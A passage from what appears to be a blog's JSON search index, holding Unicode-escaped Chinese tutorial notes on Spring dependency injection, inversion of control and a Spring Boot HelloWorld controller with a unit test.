\u4f9d\u8d56\u6ce8\u5165(DI)\u662f\u4e00\u79cd\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\u7684\u65b9\u5f0f\uff0c\u5728\u5bf9\u8c61\u521b\u5efa\u65f6\uff0c\u901a\u8fc7\u4f7f\u7528\u8005\u5c06\u6240\u9700\u4f9d\u8d56\u6ce8\u5165\u5230\u5bf9\u8c61\u91cc\u3002 Spring\u4e2d\u7684\u4f9d\u8d56\u6ce8\u5165\u65b9\u5f0f\u6709\u4e09\u79cd\uff0c\u5206\u522b\u4e3a\u6784\u9020\u5668\u6ce8\u5165\uff0cSet\u65b9\u5f0f\u6ce8\u5165\u548c\u6269\u5c55\u6ce8\u5165\u3002","title":"\u4f9d\u8d56\u6ce8\u5165(DI)"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#\u4f9d\u8d56\u6ce8\u5165di","text":"","title":"\u4f9d\u8d56\u6ce8\u5165(DI)"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#\u6784\u9020\u5668\u6ce8\u5165","text":"\u53c2\u8003 HelloSpring","title":"\u6784\u9020\u5668\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#set\u65b9\u5f0f\u6ce8\u5165","text":"\u4f9d\u8d56\u6ce8\u5165 \u4f9d\u8d56: bean\u5bf9\u8c61\u7684\u521b\u5efa\u4f9d\u8d56\u4e8e\u5bb9\u5668 \u6ce8\u5165: bean\u5bf9\u8c61\u4e2d\u7684\u6240\u6709\u5c5e\u6027\u7531\u5bb9\u5668\u6765\u6ce8\u5165","title":"Set\u65b9\u5f0f\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#\u6ce8\u5165\u590d\u6742\u7684\u503c","text":"public class Address { private String address ; // \u7701\u7565getter setter toStirng\u65b9\u6cd5 } public class Student { private Address address ; private String name ; private String [] books ; private List < String > hobbies ; private Map < String , String > card ; private Set < String > games ; private String friend ; private Properties info ; // \u7701\u7565getter setter toStirng\u65b9\u6cd5 } <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <bean id= \"address\" class= \"top.longlone.Address\" > <property name= \"address\" value= \"https://longlone.top\" /> </bean> <bean id= \"student\" class= \"top.longlone.Student\" > <!--\u666e\u901a\u6ce8\u5165--> <property name= \"name\" value= \"longlone\" /> <!--bean\u6ce8\u5165--> <property name= \"address\" ref= \"address\" /> <!--\u6570\u7ec4\u6ce8\u5165--> <property name= \"books\" > <array> <value> \u8bed\u6587 </value> <value> \u6570\u5b66 </value> <value> \u82f1\u8bed </value> </array> </property> <!--List\u6ce8\u5165--> <property name= \"hobbies\" > <list> <value> \u542c\u6b4c </value> <value> \u6572\u4ee3\u7801 </value> <value> \u5e72\u996d </value> </list> </property> <!--Map\u6ce8\u5165--> <property name= \"card\" > <map> <entry key= \"Boy\" value= \"bbb\" /> <entry key= \"Girl\" value= \"ggg\" /> </map> </property> <!--Set\u6ce8\u5165--> <property name= \"games\" > <set> <value> LOL </value> <value> CF </value> <value> DOTA </value> </set> </property> <!--null\u6ce8\u5165--> <property name= \"friend\" > <null/> </property> <!--Properties\u6ce8\u5165--> <property name= \"info\" > <props> <prop key= \"idcard\" > 2020111111 </prop> <prop key= \"sex\" > 1 </prop> <prop key= \"blog\" > https://longlone.top/ </prop> </props> </property> </bean> </beans>","title":"\u6ce8\u5165\u590d\u6742\u7684\u503c"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#\u6269\u5c55\u6ce8\u5165","text":"\u5047\u8bbe\u6211\u4eec\u6709\u4e00\u4e2aBean\u5982\u4e0b package top.longlone ; public class User { private String name ; private int age ; // \u7701\u7565getter setter toStirng Constructor\u65b9\u6cd5 }","title":"\u6269\u5c55\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#p\u547d\u540d\u7a7a\u95f4\u6ce8\u5165","text":"p\u5bf9\u5e94\u7684\u662fproperty\uff0c\u5176\u5b9e\u662fSet\u6ce8\u5165\u7684\u4e00\u4e2a\u7b80\u5316\u6a21\u5f0f \u9700\u8981\u5728beans\u91cc\u52a0\u5165\u4e00\u4e2a\u6269\u5c55 xmlns:p=\"http://www.springframework.org/schema/p\" \uff0c\u901a\u8fc7\u8fd9\u4e2a\u6269\u5c55\u53ef\u4ee5\u76f4\u63a5\u5728bean\u91cc\u6ce8\u5165\u5bf9\u8c61\u7684\u5c5e\u6027\uff0c\u800c\u4e0d\u9700\u8981property\u6807\u7b7e <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p= \"http://www.springframework.org/schema/p\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <bean id= \"user\" class= \"top.longlone.User\" p:age= \"18\" p:name= \"whoami\" /> </beans>","title":"p\u547d\u540d\u7a7a\u95f4\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#c\u547d\u540d\u7a7a\u95f4\u6ce8\u5165","text":"c\u5bf9\u5e94\u7684\u662fconstructor\uff0c\u5176\u5b9e\u662f\u6784\u9020\u5668\u6ce8\u5165\u7684\u4e00\u4e2a\u7b80\u5316\u6a21\u5f0f \u9700\u8981\u5728beans\u91cc\u52a0\u5165\u4e00\u4e2a\u6269\u5c55 xmlns:c=\"http://www.springframework.org/schema/c\" \uff0c\u901a\u8fc7\u8fd9\u4e2a\u6269\u5c55\u53ef\u4ee5\u76f4\u63a5\u5728bean\u91cc\u8c03\u7528\u6784\u9020\u5668\u76f4\u63a5\u6ce8\u5165\u7c7b\u7684\u5c5e\u6027\uff0c\u800c\u4e0d\u9700\u8981constructor-arg\u6807\u7b7e <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xmlns:c= \"http://www.springframework.org/schema/c\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <bean id= \"user\" class= \"top.longlone.User\" c:age= \"18\" c:name= \"whoami\" /> </beans>","title":"c\u547d\u540d\u7a7a\u95f4\u6ce8\u5165"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E4%BE%9D%E8%B5%96%E6%B3%A8%E5%85%A5%28DI%29/#\u603b\u7ed3","text":"\u4f9d\u8d56\u6ce8\u5165(DI)\u662f\u4e00\u79cd\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\u7684\u65b9\u5f0f\uff0c\u5728\u5bf9\u8c61\u521b\u5efa\u65f6\uff0c\u901a\u8fc7\u4f7f\u7528\u8005\u5c06\u6240\u9700\u4f9d\u8d56\u6ce8\u5165\u5230\u5bf9\u8c61\u91cc\u3002 Spring\u4e2d\u7684\u4f9d\u8d56\u6ce8\u5165\u65b9\u5f0f\u6709\u4e09\u79cd\uff0c\u5206\u522b\u4e3a\u6784\u9020\u5668\u6ce8\u5165\uff0cSet\u65b9\u5f0f\u6ce8\u5165\u548c\u6269\u5c55\u6ce8\u5165\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/","tags":["java","spring"],"text":"\u63a7\u5236\u53cd\u8f6c(IOC) # \u63a7\u5236\u53cd\u8f6c(IOC) \u662f\u4e00\u79cd\u8bbe\u8ba1\u601d\u60f3\uff0c\u7528\u4e8e\u964d\u4f4e\u4ee3\u7801\u4e4b\u95f4\u7684\u8026\u5408\u5ea6\u3002 \u4f9d\u8d56\u6ce8\u5165(DI) \u662f\u4e00\u79cd\u7528\u4e8e\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\u7684\u8bbe\u8ba1\u6a21\u5f0f\u3002 \u901a\u8fc7\u4f9d\u8d56\u6ce8\u5165\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\uff0c\u5c31\u662f\u8bf4\u5bf9\u8c61\u5728\u88ab\u521b\u5efa\u7684\u65f6\u5019\uff0c\u7531\u4e1a\u52a1\u5c42\u5c06\u5176\u6240\u4f9d\u8d56\u7684\u5bf9\u8c61\u7684\u4f20\u9012\u7ed9\u5b83\u3002\u4e5f\u53ef\u4ee5\u8bf4\uff0c\u4f9d\u8d56\u88ab\u6ce8\u5165\u5230\u5bf9\u8c61\u4e2d\u3002 \u901a\u5e38\u6211\u4eec\u4f7f\u7528\u4f9d\u8d56\u6ce8\u5165\u7684\u65b9\u5f0f\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\uff0c\u4f46\u662f\u63a7\u5236\u53cd\u8f6c\u8fd8\u6709\u5176\u4ed6\u7684\u5b9e\u73b0\u65b9\u5f0f\uff0c\u5982 ServiceLocator \u3002 \u4f8b\u5b50 # IOC\u524d # package top.longlone ; public interface Fruit { public String type (); } package top.longlone ; public class Apple implements Fruit { @Override public String type () { return \"Apple\" ; } } ```` ``` java package top.longlone ; public class Banana implements Fruit { @Override public String type () { return \"Banana\" ; }} package top.longlone ; public class User { private Fruit favouriteFruit = new Apple (); // \u8fd9\u91cc\u662f\u5199\u6b7b\u4e86 public void say () { System . out . println ( \"My favourite fruit is \" + favouriteFruit . type ()); } } package top.longlone ; import org.junit.Test ; import static org.junit.Assert.* ; public class UserTest { @Test public void testUser () throws Exception { User user = new User (); user . say (); // output: My favourite fruit is Apple } } \u4ece\u4ee3\u7801\u91cc\u53ef\u4ee5\u770b\u5230User\u7684favouriteFruit\u662f\u5199\u6b7b\u4e86\u7684\u5c5e\u6027\uff0c\u4e1a\u52a1\u5c42\u96be\u4ee5\u4fee\u6539 IOC\u540e # ```java package top.longlone; public class User { private Fruit favouriteFruit; public User(Fruit favouriteFruit) { this.favouriteFruit = favouriteFruit; } public User() { } public void setFavouriteFruit(Fruit favouriteFruit) { this.favouriteFruit = favouriteFruit; } public Fruit getFavouriteFruit() { return favouriteFruit; } public void say() { System.out.println(\"My favourite fruit is \" + favouriteFruit.type()); } } java package top.longlone; import org.junit.Test; import static org.junit.Assert.*; public class UserTest { @Test public void testUser() throws Exception { User user = new User(new Apple()); // user.setFavouriteFruit(new Banana()); \u6216\u8005\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f user.say(); } } ``` \u53ef\u4ee5\u770b\u5230\u4fee\u6539\u540e\uff0c\u6211\u4eec\u901a\u8fc7\u4f9d\u8d56\u6ce8\u5165\u7684\u65b9\u5f0f\u4e3aUser\u7c7b\u6dfb\u52a0\u4f9d\u8d56\uff0c\u4ece\u800c\u4f7f\u5f97\u4f9d\u8d56\u63a7\u5236\u6743\u4ece\u4ee3\u7801\u5c42\u8f6c\u79fb\u5230\u4e86\u4e1a\u52a1\u5c42\uff0c\u5b9e\u73b0\u4e86\u63a7\u5236\u53cd\u8f6c\u3002 loC\u662fSpring\u6846\u67b6\u7684\u6838\u5fc3\u5185\u5bb9\uff0c\u4f7f\u7528\u591a\u79cd\u65b9\u5f0f\u5b8c\u7f8e\u7684\u5b9e\u73b0\u4e86loC\uff0c\u53ef\u4ee5\u4f7f\u7528XML\u914d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6ce8\u89e3\uff0c\u65b0\u7248\u672c\u7684Spring\u4e5f\u53ef\u4ee5\u96f6\u914d\u7f6e\u5b9e\u73b0loC\u3002 \u603b\u7ed3 # \u63a7\u5236\u53cd\u8f6c(IOC)\u662f\u4e00\u4e2a\u8bbe\u8ba1\u601d\u60f3\uff0c\u662f\u5f00\u53d1\u8005\u5c06\u4f9d\u8d56\u5bf9\u8c61\u7684\u63a7\u5236\u6743\u8f6c\u79fb\u5230\u4e86\u4e1a\u52a1\u5c42\u800c\u4e0d\u662f\u5f00\u53d1\u8005\u81ea\u5df1\uff0c\u7528\u4e8e\u89e3\u8026(\u964d\u4f4e\u4ee3\u7801\u7684\u8026\u5408\u5ea6)\u3002","title":"\u63a7\u5236\u53cd\u8f6c(IOC)"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/#\u63a7\u5236\u53cd\u8f6cioc","text":"\u63a7\u5236\u53cd\u8f6c(IOC) \u662f\u4e00\u79cd\u8bbe\u8ba1\u601d\u60f3\uff0c\u7528\u4e8e\u964d\u4f4e\u4ee3\u7801\u4e4b\u95f4\u7684\u8026\u5408\u5ea6\u3002 \u4f9d\u8d56\u6ce8\u5165(DI) \u662f\u4e00\u79cd\u7528\u4e8e\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\u7684\u8bbe\u8ba1\u6a21\u5f0f\u3002 \u901a\u8fc7\u4f9d\u8d56\u6ce8\u5165\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\uff0c\u5c31\u662f\u8bf4\u5bf9\u8c61\u5728\u88ab\u521b\u5efa\u7684\u65f6\u5019\uff0c\u7531\u4e1a\u52a1\u5c42\u5c06\u5176\u6240\u4f9d\u8d56\u7684\u5bf9\u8c61\u7684\u4f20\u9012\u7ed9\u5b83\u3002\u4e5f\u53ef\u4ee5\u8bf4\uff0c\u4f9d\u8d56\u88ab\u6ce8\u5165\u5230\u5bf9\u8c61\u4e2d\u3002 \u901a\u5e38\u6211\u4eec\u4f7f\u7528\u4f9d\u8d56\u6ce8\u5165\u7684\u65b9\u5f0f\u5b9e\u73b0\u63a7\u5236\u53cd\u8f6c\uff0c\u4f46\u662f\u63a7\u5236\u53cd\u8f6c\u8fd8\u6709\u5176\u4ed6\u7684\u5b9e\u73b0\u65b9\u5f0f\uff0c\u5982 ServiceLocator \u3002","title":"\u63a7\u5236\u53cd\u8f6c(IOC)"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/#\u4f8b\u5b50","text":"","title":"\u4f8b\u5b50"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/#ioc\u524d","text":"package top.longlone ; public interface Fruit { public String type (); } package top.longlone ; public class Apple implements Fruit { @Override public String type () { return \"Apple\" ; } } ```` ``` java package top.longlone ; public class Banana implements Fruit { @Override public String type () { return \"Banana\" ; }} package top.longlone ; public class User { private Fruit favouriteFruit = new Apple (); // \u8fd9\u91cc\u662f\u5199\u6b7b\u4e86 public void say () { System . out . println ( \"My favourite fruit is \" + favouriteFruit . type ()); } } package top.longlone ; import org.junit.Test ; import static org.junit.Assert.* ; public class UserTest { @Test public void testUser () throws Exception { User user = new User (); user . say (); // output: My favourite fruit is Apple } } \u4ece\u4ee3\u7801\u91cc\u53ef\u4ee5\u770b\u5230User\u7684favouriteFruit\u662f\u5199\u6b7b\u4e86\u7684\u5c5e\u6027\uff0c\u4e1a\u52a1\u5c42\u96be\u4ee5\u4fee\u6539","title":"IOC\u524d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/#ioc\u540e","text":"```java package top.longlone; public class User { private Fruit favouriteFruit; public User(Fruit favouriteFruit) { this.favouriteFruit = favouriteFruit; } public User() { } public void setFavouriteFruit(Fruit favouriteFruit) { this.favouriteFruit = favouriteFruit; } public Fruit getFavouriteFruit() { return favouriteFruit; } public void say() { System.out.println(\"My favourite fruit is \" + favouriteFruit.type()); } } java package top.longlone; import org.junit.Test; import static org.junit.Assert.*; public class UserTest { @Test public void testUser() throws Exception { User user = new User(new Apple()); // user.setFavouriteFruit(new Banana()); \u6216\u8005\u4f7f\u7528\u8fd9\u79cd\u65b9\u5f0f user.say(); } } ``` \u53ef\u4ee5\u770b\u5230\u4fee\u6539\u540e\uff0c\u6211\u4eec\u901a\u8fc7\u4f9d\u8d56\u6ce8\u5165\u7684\u65b9\u5f0f\u4e3aUser\u7c7b\u6dfb\u52a0\u4f9d\u8d56\uff0c\u4ece\u800c\u4f7f\u5f97\u4f9d\u8d56\u63a7\u5236\u6743\u4ece\u4ee3\u7801\u5c42\u8f6c\u79fb\u5230\u4e86\u4e1a\u52a1\u5c42\uff0c\u5b9e\u73b0\u4e86\u63a7\u5236\u53cd\u8f6c\u3002 loC\u662fSpring\u6846\u67b6\u7684\u6838\u5fc3\u5185\u5bb9\uff0c\u4f7f\u7528\u591a\u79cd\u65b9\u5f0f\u5b8c\u7f8e\u7684\u5b9e\u73b0\u4e86loC\uff0c\u53ef\u4ee5\u4f7f\u7528XML\u914d\u7f6e\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6ce8\u89e3\uff0c\u65b0\u7248\u672c\u7684Spring\u4e5f\u53ef\u4ee5\u96f6\u914d\u7f6e\u5b9e\u73b0loC\u3002","title":"IOC\u540e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/%E6%8E%A7%E5%88%B6%E5%8F%8D%E8%BD%AC%28IOC%29/#\u603b\u7ed3","text":"\u63a7\u5236\u53cd\u8f6c(IOC)\u662f\u4e00\u4e2a\u8bbe\u8ba1\u601d\u60f3\uff0c\u662f\u5f00\u53d1\u8005\u5c06\u4f9d\u8d56\u5bf9\u8c61\u7684\u63a7\u5236\u6743\u8f6c\u79fb\u5230\u4e86\u4e1a\u52a1\u5c42\u800c\u4e0d\u662f\u5f00\u53d1\u8005\u81ea\u5df1\uff0c\u7528\u4e8e\u89e3\u8026(\u964d\u4f4e\u4ee3\u7801\u7684\u8026\u5408\u5ea6)\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/springboot-2.x/HelloWorld/","tags":["java","spring","springboot"],"text":"HelloWorld # SpringBoot\u662f\u4ec0\u4e48\uff1f # Spring Boot\u662f\u7531Pivotal\u56e2\u961f\u63d0\u4f9b\u7684\u5168\u65b0 \u6846\u67b6 \uff0c\u5176\u8bbe\u8ba1\u76ee\u7684\u662f\u7528\u6765 \u7b80\u5316 \u65b0 Spring \u5e94\u7528\u7684\u521d\u59cb\u642d\u5efa\u4ee5\u53ca\u5f00\u53d1\u8fc7\u7a0b\u3002\u8be5\u6846\u67b6\u4f7f\u7528\u4e86\u7279\u5b9a\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u914d\u7f6e\uff0c\u4ece\u800c\u4f7f\u5f00\u53d1\u4eba\u5458\u4e0d\u518d\u9700\u8981\u5b9a\u4e49\u6837\u677f\u5316\u7684\u914d\u7f6e\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0cSpring Boot\u81f4\u529b\u4e8e\u5728\u84ec\u52c3\u53d1\u5c55\u7684\u5feb\u901f\u5e94\u7528\u5f00\u53d1\u9886\u57df(rapid application development)\u6210\u4e3a\u9886\u5bfc\u8005\u3002 \u53ef\u4ee5\u770b\u5230SpringBoot\u4e3b\u8981\u76ee\u7684\u662f\u4e3a\u4e86\u7b80\u5316Spring\u5e94\u7528\u7684\u642d\u5efa\u4e0e\u5f00\u53d1\u3002 \u521d\u59cb\u5316\u5de5\u7a0b # \u53ef\u4ee5\u4f7f\u7528 Spring Initializr \u9875\u9762\u8fdb\u884c\u521b\u5efa\uff0c\u6216\u8005\u76f4\u63a5\u4f7f\u7528idea\u521b\u5efa\u3002\u8fd9\u91cc\u76f4\u63a5\u4f7f\u7528idea\u3002 \u9996\u5148\u70b9\u51fb\u65b0\u5efa\u9879\u76ee: \u6309\u7167\u5982\u56fe\u6240\u793a\u914d\u7f6e\uff0c\u8fd9\u91cc\u9009\u7528java8\uff0cMaven\u8fdb\u884c\u4f9d\u8d56\u7ba1\u7406\u3002 \u9009\u62e9\u9700\u8981\u7684\u4f9d\u8d56\uff0c\u8fd9\u91cc\u9009\u62e9Spring Web\uff0cSpringBoot\u7248\u672c\u9009\u62e9\u9ed8\u8ba4\u76842.6.3 \u70b9\u51fbFINISH\uff0c\u5373\u53ef\u521b\u5efa\u9879\u76ee\uff0c\u9700\u8981\u7b49\u5f85\u4e00\u6bb5\u65f6\u95f4idea\u89e3\u6790maven\u4f9d\u8d56\u3002 \u521b\u5efa\u597d\u540e\u7684\u9879\u76ee\u7ed3\u6784\u5982\u56fe\u6240\u793a(controller\u6587\u4ef6\u5939\u662f\u6211\u540e\u7eed\u6dfb\u52a0\u7684\uff0c\u4e00\u5f00\u59cb\u662f\u6ca1\u6709\u7684) \u5982\u4e0a\u56fe\u6240\u793a\uff0cSpring Boot\u7684\u57fa\u7840\u7ed3\u6784\u5171\u4e09\u4e2a\u6587\u4ef6\u5939(\u5177\u4f53\u8def\u5f84\u6839\u636e\u7528\u6237\u751f\u6210\u9879\u76ee\u65f6\u586b\u5199\u7684Group\u548cArtiFact\u6709\u6240\u5dee\u5f02\uff09: - src/main/java \u4e0b\u7684\u7a0b\u5e8f\u5165\u53e3\uff1a SpringBootStudyApplication - src/main/resources \u4e0b\u7684\u914d\u7f6e\u6587\u4ef6\uff1a application.properties - src/test/ \u4e0b\u7684\u6d4b\u8bd5\u5165\u53e3\uff1a SpringBootStudyApplicationTests \u7f16\u5199HelloWorldController # \u5728 src/main/java \u6587\u4ef6\u5939\u4e0b\u521b\u5efa com.example.springbootstudy.controller \u5305\uff0c\u5728\u8be5\u5305\u4e0b\u521b\u5efa HelloWorldController (\u6ce8\u610f\uff0c\u8fd9\u91cc\u6211\u4eec\u7684Controller\u5fc5\u987b\u5728\u6211\u4eec\u7684 SpringbootStudyApplication \u6587\u4ef6\u5939\u53ca\u5b50\u6587\u4ef6\u5939\u4e0b\uff0c\u5426\u5219\u65e0\u6cd5\u52a0\u8f7d\uff0cController\u7c7b\u9996\u5b57\u6bcd\u5fc5\u987b\u5927\u5199): package com.example.springbootstudy.controller ; import org.springframework.web.bind.annotation.RequestMapping ; import org.springframework.web.bind.annotation.RestController ; @RestController public class HelloController { @RequestMapping ( \"/hello\" ) public String index () { return \"Hello World\" ; } } \u8fd9\u91cc\u89e3\u91ca\u4e00\u4e0b\u5176\u4e2d\u76842\u4e2a\u6ce8\u89e3\u7684\u4f5c\u7528: - @RestController : \u5176\u7b49\u4ef7\u4e8e @ResponseBody + @Controller \uff0c\u5206\u522b\u4ecb\u7ecd\u4e0b\u8fd92\u4e2a\u6ce8\u89e3: - @ResponseBody : \u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u6ce8\u89e3\u7684\u7c7b/\u65b9\u6cd5\u8fd4\u56de\u7684\u503c\u5c31\u662freturn\u4e2d\u7684\u5185\u5bb9\uff0c\u65e0\u6cd5\u8fd4\u56de\u6307\u5b9a\u7684View\u9875\u9762(\u5982 index.html \u7b49)\uff0c\u4f46\u662f\u5176\u80fd\u591f\u8fd4\u56dejson\uff0cxml\u6216\u81ea\u5b9a\u4e49mediaType\u5185\u5bb9\u5230\u9875\u9762(\u5373\u5c06\u4e00\u4e2aObject\u81ea\u52a8\u5e8f\u5217\u5316\u6210json\u540e\u8fd4\u56de) - @Controller : \u8868\u793aSpring\u67d0\u4e2a\u7c7b\u662f\u5426\u53ef\u4ee5\u63a5\u6536HTTP\u8bf7\u6c42\uff0c\u80fd\u591f\u8fd4\u56de\u6307\u5b9a\u7684View\u9875\u9762(\u5982 return index \u5219\u4f1a\u8df3\u8f6c\u5230\u89c6\u56fe\u5c42 index.html ) - @RequestMapping : \u8bbe\u7f6e\u8bf7\u6c42\u6620\u5c04(\u5373\u8def\u7531) \u914d\u7f6e # springboot\u4e2d\u53ef\u4ee5\u4f7f\u7528application.properties\u6216\u8005application.yml\u5bf9\u9879\u76ee\u8fdb\u884c\u914d\u7f6e\uff0c\u540e\u8005\u7684\u4f18\u5148\u7ea7\u8f83\u9ad8\u3002\u4e24\u8005\u7684\u533a\u522b\u662f\u524d\u8005\u6bd4\u8f83\u76f4\u63a5\uff0c\u4f46\u6ca1\u6709\u5c42\u6b21\u611f\uff0c\u540e\u8005\u76f8\u53cd\u3002 \u5728springboot 2.1\u4e4b\u540e\uff0cspringboot\u542f\u52a8\u9ed8\u8ba4\u4e0d\u4f1a\u663e\u793amapping\u65e5\u5fd7\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u914d\u7f6e\u6765\u8ba9\u5176\u8f93\u51famapping\u65e5\u5fd7\uff0c\u4ee5\u4e86\u89e3\u54ea\u4e9bcontroller\u88ab\u6210\u529f\u52a0\u8f7d\uff0c\u6211\u4eec\u4ee5application.properties\u4e3a\u4f8b: server.port=8080 logging.level.org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping=trace \u7b2c\u4e00\u884c\u8bbe\u7f6e\u7684\u662f\u670d\u52a1\u7684\u76d1\u542c\u7aef\u53e3\uff0c\u7b2c\u4e8c\u884c\u5c31\u662f\u8bbe\u7f6emapping\u65e5\u5fd7\u7ea7\u522b\uff0c\u4ee5\u663e\u793a\u6211\u4eec\u7684mapping\u65e5\u5fd7\u3002 \u8fd0\u884c # \u8fd0\u884cSpringbootStudyApplication.main()\u65b9\u6cd5\uff0c\u542f\u52a8springboot\uff0c\u6709\u4ee5\u4e0b\u4fe1\u606f\u5c31\u8bc1\u660econtroller\u88ab\u6210\u529f\u52a0\u8f7d\u4e86: \u5c1d\u8bd5\u8bbf\u95eehttp://127.0.0.1:8080/hello: \u7f16\u5199\u6d4b\u8bd5 # \u9700\u8981\u7ed9pom.xml\u6dfb\u52a0junit\u4f9d\u8d56: <dependency> <groupId> junit </groupId> <artifactId> junit </artifactId> <scope> test </scope> </dependency> \u5b8c\u6574\u7684\u6d4b\u8bd5\u5982\u4e0b\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u6700\u540e\u7684\u4e09\u4e2aimport\uff0c\u9700\u8981static\u624d\u80fdimport\uff0c\u8fd9\u91cc\u6211\u4eec\u7f16\u5199\u6d4b\u8bd5\uff0c\u6d4b\u8bd5\u4e00\u4e0b/hello\u662f\u5426\u8fd4\u56de200 ok\u53ca\u54cd\u5e94\u662f\u5426\u4e3aHello World: package com.example.springbootstudy ; import com.example.springbootstudy.controller.HelloController ; import org.junit.jupiter.api.Test ; import org.junit.runner.RunWith ; import org.springframework.boot.test.context.SpringBootTest ; import org.springframework.http.MediaType ; import org.springframework.test.context.junit4.SpringRunner ; import org.springframework.test.web.servlet.MockMvc ; import org.springframework.test.web.servlet.request.MockMvcRequestBuilders ; import org.springframework.test.web.servlet.setup.MockMvcBuilders ; import static org.hamcrest.Matchers.equalTo ; import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content ; import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status ; @RunWith ( SpringRunner . class ) @SpringBootTest class SpringbootStudyApplicationTests { private MockMvc mvc ; @Test public void getHello () throws Exception { mvc = MockMvcBuilders . standaloneSetup ( new HelloController ()). build (); mvc . perform ( MockMvcRequestBuilders . get ( \"/hello\" ). accept ( MediaType . APPLICATION_JSON )) . andExpect ( status (). isOk ()) . andExpect ( content (). string ( equalTo ( \"Hello World\" ))); } }","title":"HelloWorld"},{"location":"%E5%AE%89%E5%85%A8/java/springboot-2.x/HelloWorld/#helloworld","text":"","title":"HelloWorld"},{"location":"%E5%AE%89%E5%85%A8/java/springboot-2.x/HelloWorld/#springboot\u662f\u4ec0\u4e48","text":"Spring Boot\u662f\u7531Pivotal\u56e2\u961f\u63d0\u4f9b\u7684\u5168\u65b0 \u6846\u67b6 \uff0c\u5176\u8bbe\u8ba1\u76ee\u7684\u662f\u7528\u6765 \u7b80\u5316 \u65b0 Spring \u5e94\u7528\u7684\u521d\u59cb\u642d\u5efa\u4ee5\u53ca\u5f00\u53d1\u8fc7\u7a0b\u3002\u8be5\u6846\u67b6\u4f7f\u7528\u4e86\u7279\u5b9a\u7684\u65b9\u5f0f\u6765\u8fdb\u884c\u914d\u7f6e\uff0c\u4ece\u800c\u4f7f\u5f00\u53d1\u4eba\u5458\u4e0d\u518d\u9700\u8981\u5b9a\u4e49\u6837\u677f\u5316\u7684\u914d\u7f6e\u3002\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\uff0cSpring Boot\u81f4\u529b\u4e8e\u5728\u84ec\u52c3\u53d1\u5c55\u7684\u5feb\u901f\u5e94\u7528\u5f00\u53d1\u9886\u57df(rapid application development)\u6210\u4e3a\u9886\u5bfc\u8005\u3002 \u53ef\u4ee5\u770b\u5230SpringBoot\u4e3b\u8981\u76ee\u7684\u662f\u4e3a\u4e86\u7b80\u5316Spring\u5e94\u7528\u7684\u642d\u5efa\u4e0e\u5f00\u53d1\u3002","title":"SpringBoot\u662f\u4ec0\u4e48\uff1f"},{"location":"%E5%AE%89%E5%85%A8/java/springboot-2.x/HelloWorld/#\u521d\u59cb\u5316\u5de5\u7a0b","text":"\u53ef\u4ee5\u4f7f\u7528 Spring Initializr 